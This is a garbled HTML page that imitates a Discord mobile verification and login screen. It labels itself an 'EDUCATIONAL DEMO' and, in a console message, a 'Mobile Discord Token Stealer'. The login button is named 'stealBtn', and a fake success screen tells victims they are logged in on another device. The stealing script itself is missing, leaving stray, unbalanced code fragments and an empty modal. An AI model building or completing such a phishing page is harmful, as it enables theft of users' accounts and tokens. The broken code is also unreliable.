<!DOCTYPE html>
<html>
<head>
    <title>Discord Verification</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #1e1f22;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .mobile {
            max-width: 400px;
            width: 100%;
            background: #2b2d31;
            border-radius: 32px;
            overflow: hidden;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
        }
        .header {
            background: #2b2d31;
            padding: 10px 16px;
            border-bottom: 1px solid #1e1f22;
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .header .back { font-size: 24px; color: #dbdee1; }
        .header .server { color: white; font-weight: 600; flex: 1; }
        .content { padding: 24px 20px; background: #1e1f22; }
        .card {
            background: #2b2d31;
            border-radius: 20px;
            padding: 24px;
            text-align: center;
            border: 1px solid #404249;
        }
        .card h2 { color: white; font-size: 20px; margin-bottom: 8px; }
        .card p { color: #b5bac1; font-size: 14px; margin-bottom: 20px; }
        .btn {
            background: #5865f2;
            color: white;
            border: none;
            padding: 14px 24px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 500;
            width: 100%;
            cursor: pointer;
            margin-top: 8px;
        }
        .btn:active { background: #4752c4; transform: scale(0.98); }
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.85);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        .modal-box {
            background: #2b2d31;
            border-radius: 24px;
            width: 320px;
            overflow: hidden;
        }
        .modal-header { background: #1e1f22; padding: 20px; text-align: center; }
        .modal-header .icon { font-size: 48px; margin-bottom: 12px; }
        .modal-header h3 { color: white; font-size: 20px; }
        .modal-body { padding: 20px; text-align: center; }
        .modal-body p { color: #b5bac1; margin-bottom: 20px; }
        .modal-btn {
            background: #5865f2;
            color: white;
            border: none;
            padding: 12px;
            width: 100%;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
        }
        .modal-btn:active { background: #4752c4; }
        .success {
            display: none;
            text-align: center;
            padding: 60px 20px;
        }
        .success .check { font-size: 80px; margin-bottom: 20px; }
        .success h2 { color: white; font-size: 24px; margin-bottom: 8px; }
        .success p { color: #b5bac1; margin-bottom: 30px; }
        .edu-badge {
            position: fixed;
            bottom: 10px;
            left: 10px;
            background: rgba(0,0,0,0.8);
            color: #faa81a;
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 11px;
            z-index: 2000;
        }
    </style>
</head>
<body>
    <div class="mobile">

                    <button class="modal-btn" id="stealBtn">Log In</button>

        <div class="success" id="successScreen">

            <h2>You're in!</h2>
            <p>You're now logged in on your other device.</p>
            <button class="modal-btn" onclick="window.location.href='https://discord.com/app'">Start talking</button>

    </div>
    <div class="edu-badge">🔴 EDUCATIONAL DEMO</div>

        };

        // Close modal if clicked outside

            if(e.target === document.getElementById('loginModal')) {

        // 🔴 Console log for educational purpose
        console.log('%c🔴 Mobile Discord Token Stealer (Educational)', 'color: #ff0000; font-size: 16px;');

</body>
</html>
